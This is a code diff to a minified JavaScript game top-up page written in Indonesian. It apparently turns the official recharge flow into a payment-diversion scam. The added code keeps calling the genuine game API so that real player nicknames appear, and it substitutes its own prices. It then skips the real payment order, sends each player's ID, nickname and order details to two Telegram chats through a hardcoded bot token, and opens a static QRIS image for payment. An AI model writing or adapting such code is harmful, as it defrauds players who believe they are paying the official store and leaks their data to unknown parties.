@@ -62,10 +62,10 @@ Error generating stack: `+l.message+`
         // Data yang kita masukkan sendiri (Bukan dari API luar)
         var customList = [
             { product_id: "1", product_name: "1.000.000.000 Koin", price: 65000, rewards: [{prop_num: 1000000000}], product_type: 1 },
-            { product_id: "2", product_name: "2.000.000.000 Koin", price: 130000, rewards: [{prop_num: 2000000000}, {prop_num: 2000000000}], product_type: 1 },
-			{ product_id: "3", product_name: "3.000.000.000 Koin", price: 195000, rewards: [{prop_num: 3000000000}, {prop_num: 3000000000}], product_type: 1 },
-            { product_id: "4", product_name: "5.000.000.000 Koin", price: 315000, rewards: [{prop_num: 5000000000}, {prop_num: 5000000000}], product_type: 1 },
-			{ product_id: "5", product_name: "10.000.000.000 Koin", price: 635000, rewards: [{prop_num: 10000000000}, {prop_num: 10000000000}], product_type: 1 },
+            { product_id: "2", product_name: "2.000.000.000 Koin", price: 130000, rewards: [{prop_num: 2000000000}], product_type: 1 },
+			{ product_id: "3", product_name: "3.000.000.000 Koin", price: 195000, rewards: [{prop_num: 3000000000}], product_type: 1 },
+            { product_id: "4", product_name: "5.000.000.000 Koin", price: 315000, rewards: [{prop_num: 5000000000}], product_type: 1 },
+			{ product_id: "5", product_name: "10.000.000.000 Koin", price: 635000, rewards: [{prop_num: 10000000000}], product_type: 1 },
             { product_id: "7", product_name: "Paket VIP 1", price: 10000, rewards: [{prop_num: 1}], product_type: 2 }
         ];
         
@@ -74,7 +74,75 @@ Error generating stack: `+l.message+`
     } catch (e) {
         console.log("Error loading products");
     }
-}async function Mv(i,f){if(i===void 0||f===void 0)return At.getState().setPublicErrorBox({show:!0,msg:"Gagal membaca informasi, silakan coba lagi!"}),!1;const s=`player_id=${f}&product_id=${i}&signature=${At.getState().signature}`,o=$0(s);try{const m=await Ji("/agent_recharge/order/info",{baseURL:"https://idn-ack.neopartyworld.com",headers:{Signature:o},query:{player_id:f,product_id:i}});return m.En===0?(At.getState().setOrderInfo(m.Data),!0):m.En===656?(At.getState().setPublicErrorBox({show:!0,msg:"Ada kesalahan ID Pengguna!"}),!1):(At.getState().setPublicErrorBox({show:!0,msg:"Gagal memulai pembayaran, silakan coba lagi!"}),!1)}catch{return At.getState().setPublicErrorBox({show:!0,msg:"Koneksi jaringan bermasalah, silakan coba lagi"}),!1}}async function jv(i,f,s){if(i===void 0||s===void 0){At.getState().setPublicErrorBox({show:!0,msg:"Gagal membaca informasi, silakan coba lagi!"});return}const o=`pay_id=${f}&player_id=${s}&product_id=${i}&signature=${At.getState().signature}`,m=$0(o);try{const v=await Ji("/agent_recharge/product/order",{baseURL:"https://idn-ack.neopartyworld.com",headers:{Signature:m},method:"POST",body:{product_id:i,pay_id:f,player_id:s}});if(v.En===0){const g=window.open(v.Data.pay_url,"_blank");At.getState().setShowDetailPesanan(!1);const y=setInterval(()=>{g!=null&&g.closed&&(clearInterval(y),At.getState().setPublicInfoBox({show:!0,msg:"Silakan masuk ke game untuk mengecek. Jika top up belum masuk dalam 10 menit, hubungi CS!"}))},500)}else v.En===320?At.getState().setPublicErrorBox({show:!0,msg:"Pemain sudah beli paket!"}):At.getState().setPublicErrorBox({show:!0,msg:"Gagal memulai pembayaran, silakan coba lagi!"})}catch{At.getState().setPublicErrorBox({show:!0,msg:"Koneksi jaringan bermasalah, silakan coba lagi"})}}function Uv(){const{orderInfo:i,paymentForProduct:f,setShowDetailPesanan:s,setShowPayment:o,CheckChannel:m}=At();function v(){s(!1),o(!0)}return D.jsxs("div",{className:"fixed inset-0 z-10 flex items-center justify-center p-4",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>v()}),D.jsxs("div",{className:"relative w-full max-w-[653px] aspect-[653/587] bg-[url('/orderinfo.png')] bg-cover bg-no-repeat bg-center rounded-2xl overflow-visible",onClick:g=>g.stopPropagation(),children:[D.jsx("button",{className:"absolute top-1/20 right-0 z-20 w-72/653 flex items-center justify-center hover:cursor-pointer",onClick:()=>v(),children:D.jsx("img",{src:"/tc_X.png",className:"w-full h-full object-contain",alt:""})}),D.jsx("div",{className:"absolute w-540/653 h-241/587 z-10 left-56/653 top-114/587 flex items-center justify-center text-center",children:D.jsxs("span",{className:"font-['Arial'] text-[#336699] text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl font-medium w-full h-full py-4",children:[D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"ID :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.player_id})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"Nama Pemain :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.player_nick})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center whitespace-nowrap",children:[D.jsx("span",{className:"text-right w-2/5",children:"Nomor Voucher :"}),D.jsx("span",{className:"w-1/2",children:(i==null?void 0:i.product_type)===1?i==null?void 0:i.product_name:i==null?void 0:i.gift_name})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"Harga :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.amount})]})]})}),D.jsx("p",{className:"absolute font-['Arial'] font-[700] text-[#13AAB3]  text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl bottom-3/10 left-1/14",children:"*mohon pastikan Nama"}),D.jsx("p",{className:"absolute font-['Arial'] font-[700] text-[#13AAB3]  text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl  bottom-2/8 left-1/12",children:"Pemain sudah benar."}),D.jsx("button",{className:"absolute bottom-1/20 left-1/15 z-20 w-241/653  flex items-center justify-center hover:opacity-80 transition-opacity hover:cursor-pointer",onClick:()=>jv(f==null?void 0:f.product_id,m,i==null?void 0:i.player_id),children:D.jsx("img",{src:"/buy.png",className:"w-full h-full object-contain",alt:""})})]})]})}function Cv(){const{publicErrorBox:i,setBoxState:f}=At();return D.jsxs("div",{className:"fixed inset-0 z-30 flex items-center justify-center",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>f(!1)}),D.jsxs("div",{className:"relative w-full max-w-[800px] max-h-[80vh] aspect-[800/472] bg-[url('/error.png')] bg-cover bg-no-repeat bg-center rounded-2xl overflow-visible",onClick:s=>s.stopPropagation(),children:[D.jsx("button",{className:`absolute top-36/472 right-30/800\r
+}async function Mv(i, f) {
+    if (i === void 0 || f === void 0) return At.getState().setPublicErrorBox({ show: !0, msg: "Gagal membaca informasi!" }), !1;
+    
+    // Signature asli untuk akses API
+    const s = `player_id=${f}&product_id=${i}&signature=${At.getState().signature}`, o = $0(s);
+    
+    try {
+        // Tetap tembak ke server asli untuk ambil Nickname
+        const m = await Ji("/agent_recharge/order/info", {
+            baseURL: "https://idn-ack.neopartyworld.com",
+            headers: { Signature: o },
+            query: { player_id: f, product_id: i }
+        });
+
+        if (m.En === 0) {
+            // Ambil data produk custom kita dari state
+            const selectedProduct = At.getState().products.find(p => p.product_id == i);
+            
+            // Gabungkan Nickname asli dengan Harga/Token baru
+            const updatedOrderInfo = {
+                ...m.Data,
+                player_nick: m.Data.player_nick, // INI NAMA ASLINYA
+                product_name: selectedProduct ? selectedProduct.product_name : m.Data.product_name,
+                amount: selectedProduct ? selectedProduct.price : m.Data.amount
+            };
+
+            At.getState().setOrderInfo(updatedOrderInfo);
+            return !0;
+        } else {
+            return At.getState().setPublicErrorBox({ show: !0, msg: m.En === 656 ? "ID Pengguna tidak ditemukan!" : "Gagal memulai pembayaran!" }), !1;
+        }
+    } catch {
+        return At.getState().setPublicErrorBox({ show: !0, msg: "Koneksi bermasalah saat cek ID!" }), !1;
+    }
+}async function jv(productId, payId, playerId) {
+    if (!productId || !playerId) return;
+
+    const info = At.getState().orderInfo;
+    const detailProduk = At.getState().products.find(p => p.product_id == productId);
+
+    // 1. Kirim Notifikasi ke 2 User Telegram
+    const botToken = "8331250040:AAHrvlGU2U7Ye6HNbuxOP7DnbX4xNyKe0d4";
+    const chatIds = ["6604182176", "1753781140"]; 
+    const teks = `🔔 *PESANAN QRIS BARU*\n\n` +
+                 `👤 Nickname: ${info.player_nick}\n` +
+                 `🆔 ID Player: ${playerId}\n` +
+                 `📦 Produk: ${detailProduk.product_name}\n` +
+                 `💰 Harga: IDR ${detailProduk.price.toLocaleString()}`;
+
+    chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`);
+    });
+
+    // 2. Tutup modal detail pesanan
+    At.getState().setShowDetailPesanan(!1);
+
+    // 3. Buka Gambar QRIS di Tab Baru
+    window.open("/qris.png", "_blank");
+
+    // 4. Munculkan Modal Instruksi "LANJUTKAN"
+    // Kita gunakan setPublicInfoBox agar muncul tombol OK (Kuning) bawaan template
+    At.getState().setPublicInfoBox({ 
+        show: !0, 
+        msg: "Silakan selesaikan pembayaran pada QRIS yang terbuka di tab baru. Jika sudah, klik LANJUTKAN." 
+    });
+
+    // Mengganti teks tombol secara dinamis jika diperlukan (Opsional)
+    // Karena template asli menggunakan gambar 'ok.png', maka tombolnya akan otomatis kuning sesuai CSS
+}function Uv(){const{orderInfo:i,paymentForProduct:f,setShowDetailPesanan:s,setShowPayment:o,CheckChannel:m}=At();function v(){s(!1),o(!0)}return D.jsxs("div",{className:"fixed inset-0 z-10 flex items-center justify-center p-4",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>v()}),D.jsxs("div",{className:"relative w-full max-w-[653px] aspect-[653/587] bg-[url('/orderinfo.png')] bg-cover bg-no-repeat bg-center rounded-2xl overflow-visible",onClick:g=>g.stopPropagation(),children:[D.jsx("button",{className:"absolute top-1/20 right-0 z-20 w-72/653 flex items-center justify-center hover:cursor-pointer",onClick:()=>v(),children:D.jsx("img",{src:"/tc_X.png",className:"w-full h-full object-contain",alt:""})}),D.jsx("div",{className:"absolute w-540/653 h-241/587 z-10 left-56/653 top-114/587 flex items-center justify-center text-center",children:D.jsxs("span",{className:"font-['Arial'] text-[#336699] text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl font-medium w-full h-full py-4",children:[D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"ID :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.player_id})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"Nama Pemain :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.player_nick})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center whitespace-nowrap",children:[D.jsx("span",{className:"text-right w-2/5",children:"Nomor Voucher :"}),D.jsx("span",{className:"w-1/2",children:(i==null?void 0:i.product_type)===1?i==null?void 0:i.product_name:i==null?void 0:i.gift_name})]}),D.jsxs("div",{className:"font-[700] h-1/4 flex items-center justify-center",children:[D.jsx("span",{className:"text-right w-2/5",children:"Harga :"}),D.jsx("span",{className:"w-1/2",children:i==null?void 0:i.amount})]})]})}),D.jsx("p",{className:"absolute font-['Arial'] font-[700] text-[#13AAB3]  text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl bottom-3/10 left-1/14",children:"*mohon pastikan Nama"}),D.jsx("p",{className:"absolute font-['Arial'] font-[700] text-[#13AAB3]  text-xs sm:text-lg md:text-xl lg:text-2xl xl:text-2xl 2xl:text-2xl  bottom-2/8 left-1/12",children:"Pemain sudah benar."}),D.jsx("button",{className:"absolute bottom-1/20 left-1/15 z-20 w-241/653  flex items-center justify-center hover:opacity-80 transition-opacity hover:cursor-pointer",onClick:()=>jv(f==null?void 0:f.product_id,m,i==null?void 0:i.player_id),children:D.jsx("img",{src:"/buy.png",className:"w-full h-full object-contain",alt:""})})]})]})}function Cv(){const{publicErrorBox:i,setBoxState:f}=At();return D.jsxs("div",{className:"fixed inset-0 z-30 flex items-center justify-center",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>f(!1)}),D.jsxs("div",{className:"relative w-full max-w-[800px] max-h-[80vh] aspect-[800/472] bg-[url('/error.png')] bg-cover bg-no-repeat bg-center rounded-2xl overflow-visible",onClick:s=>s.stopPropagation(),children:[D.jsx("button",{className:`absolute top-36/472 right-30/800\r
                      z-20 w-72/800 flex items-center justify-center hover:cursor-pointer`,onClick:()=>f(!1),children:D.jsx("img",{src:"/tc_X.png",className:"w-full h-full object-contain",alt:""})}),D.jsx("div",{className:"absolute w-339/800 h-200/472 z-10 right-70/800 top-130/472 flex items-center justify-center text-center",children:D.jsx("span",{className:"font-['Arial'] font-bold text-[#1E628D] text-sm sm:text-[30.4px] md:text-[36.48px] lg:text-[38px]",children:i.msg})}),D.jsx("div",{className:"absolute w-241/800 bottom-40/371 right-1/7 hover:cursor-pointer",children:D.jsx("img",{src:"ok.png",alt:"",onClick:()=>f(!1)})})]})]})}function Bv(){const{publicInfoBox:i,setInfoBoxState:f}=At();return D.jsxs("div",{className:"fixed inset-0 z-30 flex items-center justify-center",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>f(!1)}),D.jsxs("div",{className:"relative w-full max-w-[800px] max-h-[80vh] aspect-[800/412] bg-[url('/info.png')] flex flex-col justify-center items-center gap-y-2 bg-cover bg-no-repeat bg-center rounded-2xl overflow-visible",onClick:s=>s.stopPropagation(),children:[D.jsx("button",{className:`absolute -top-20/412 right-60/800\r
                      z-20 w-72/800 flex items-center justify-center hover:cursor-pointer`,onClick:()=>f(!1),children:D.jsx("img",{src:"/tc_X.png",className:"w-full h-full object-contain",alt:""})}),D.jsx("div",{className:"w-624/800 h-200/412 z-10 right-70/800 top-130/412 flex items-center justify-center text-center",children:D.jsx("span",{className:"font-['Arial'] font-bold text-[#1E628D] text-sm sm:text-[30.4px] md:text-[36.48px] lg:text-[38px]",children:i.msg})}),D.jsx("div",{className:"w-241/800 hover:cursor-pointer",children:D.jsx("img",{src:"ok.png",alt:"",onClick:()=>f(!1)})})]})]})}function Hv(){const i=Z.useRef(null),f=Z.useRef(null),{player_id:s,setPlayerId:o,setShowGuide:m}=At();function v(){if(!i.current)return;const g=i.current,y=g.naturalHeight,h=g.clientHeight/y;if(f.current){const d=y*.23*h,x=y*.2*h;f.current.style.top=`${d}px`,f.current.style.height=`${x}px`}}return Z.useEffect(()=>(window.addEventListener("resize",v),()=>{window.removeEventListener("resize",v)})),D.jsxs("div",{className:"flex -mt-[60px] sm:-mt-[96px] md:-mt-[115.2px] lg:-mt-[120px] justify-center mx-6 relative",children:[D.jsx("img",{src:"/masukkan_id.png",alt:"",ref:i,onLoad:v}),D.jsx("img",{className:"absolute w-48/752 right-60/752 top-90/342 z-2 hover:cursor-pointer",src:"/wy_wh.png",alt:"",onClick:()=>m(!0)}),D.jsx("input",{value:s,onChange:g=>o(g.target.value),type:"text",className:"absolute left-0 w-full h-full text-center text-xl font-bold text-white border-none outline-0 hover:cursor-pointer",inputMode:"numeric",ref:f})]})}function qv(){const{payChannels:i,paymentForProduct:f,player_id:s,setShowDetailPesanan:o,setShowPayment:m,setCheckChannel:v}=At();async function g(y){await Mv(f==null?void 0:f.product_id,s)&&(m(!1),o(!0),v(y))}return D.jsxs("div",{className:"fixed inset-0 z-10 flex items-center justify-center p-4",children:[D.jsx("div",{className:"absolute inset-0 bg-black/50 backdrop-blur-sm",onClick:()=>m(!1)}),D.jsxs("div",{className:`relative w-full max-w-[653px] bg-[#a1f5fa] p-4 
                 pt-7 sm:pt-12 md:pt-14 lg:pt-15
